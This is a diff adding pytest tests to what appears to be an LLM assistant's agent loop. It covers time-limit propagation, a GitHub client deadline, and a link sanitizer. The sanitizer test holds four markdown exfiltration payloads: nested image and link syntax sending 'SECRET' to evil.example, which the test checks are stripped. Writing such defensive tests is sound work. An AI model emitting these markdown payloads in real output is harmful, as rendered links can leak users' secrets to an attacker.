@@ -205,3 +205,40 @@ def test_the_last_call_ends_inside_the_workers_time_limit():
     llm = Script(use("echo", key="a"), say("ok"), clock=clock, tick=95)
     run(llm, clock)
     assert [(s["model"], s["timeout"]) for s in llm.seen] == [("Lookup", 30), ("Final", 10.0)]
+
+
+# --- the second independent review of PR #17 --------------------------------------------------------------
+
+def test_the_workers_time_limit_is_not_swallowed():
+    from celery.exceptions import SoftTimeLimitExceeded
+
+    def late(client, args):
+        raise SoftTimeLimitExceeded()
+
+    with pytest.raises(SoftTimeLimitExceeded):
+        loop.run("q", HISTORY, (loop.Tool("echo", EchoArgs, late),), client=object(), llm=Script(use("echo", key="a")),
+                 now=Clock())
+
+
+def test_a_github_client_gets_the_loops_deadline():
+    import httpx
+
+    from indico_assistant.services.connectors.github import GitHubClient
+
+    client = GitHubClient("t", transport=httpx.MockTransport(lambda request: httpx.Response(200, json={})))
+    loop.run("q", HISTORY, TOOLS, client=client, llm=Script(use("echo", key="a"), say("ok")), now=Clock())
+    assert client.deadline is not None
+    client.deadline = 0  # (spent: no call starts)
+    with pytest.raises(GitHubError, match="too long"):
+        client.get("/user")
+
+
+@pytest.mark.parametrize("text", ["!![[x](https://a/)](//evil.example/?d=SECRET)",
+                                  "![[[x](https://a/)](https://b/)](//evil.example/?d=SECRET)",
+                                  "see HTTPS://EVIL.EXAMPLE/?d=SECRET now",
+                                  "[a [b] c](//evil.example/?d=SECRET) and [ok](https://github.com/o/r/pull/1)"])
+def test_checking_links_until_nothing_changes_leaves_no_image_or_outside_address(text):
+    cleaned = loop._clean(text, [], set(), "http://indico.test", {"https://github.com/o/r/pull/1"})
+    assert cleaned is None or ("![" not in cleaned and "evil" not in cleaned.lower())
+    if "ok" in text:
+        assert "[ok](https://github.com/o/r/pull/1)" in cleaned  # (what is allowed stays a link)
